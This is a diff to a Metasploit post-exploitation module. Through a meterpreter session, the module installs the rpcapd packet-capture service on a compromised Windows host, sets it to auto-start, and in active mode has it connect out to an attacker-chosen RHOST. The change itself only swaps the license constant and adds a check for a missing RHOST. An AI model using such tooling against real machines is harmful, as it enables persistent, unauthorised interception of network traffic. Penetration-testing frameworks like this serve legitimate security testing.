@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
 				the service in passive or active mode (useful if the client is behind a firewall).
 				If authentication is enabled you need a local user account to capture traffic.
 				PORT will be used depending of the mode configured.},
-			'License'       => BSD_LICENSE,
+			'License'       => MSF_LICENSE,
 			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -60,9 +60,13 @@ class Metasploit3 < Msf::Post
 					service_change_startup("rpcapd","auto")
 				end
 				if datastore['ACTIVE']==true
-					print_error("RHOST is not set ")  if datastore['RHOST']==nil
-					p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
-					print_status("Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})")
+					if datastore['RHOST']==nil
+						print_error("RHOST is not set ")
+						return
+					else
+						p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
+						print_status("Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})")
+					end
 				else
 					fw_enable(prog)
 					print_status("Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) ")
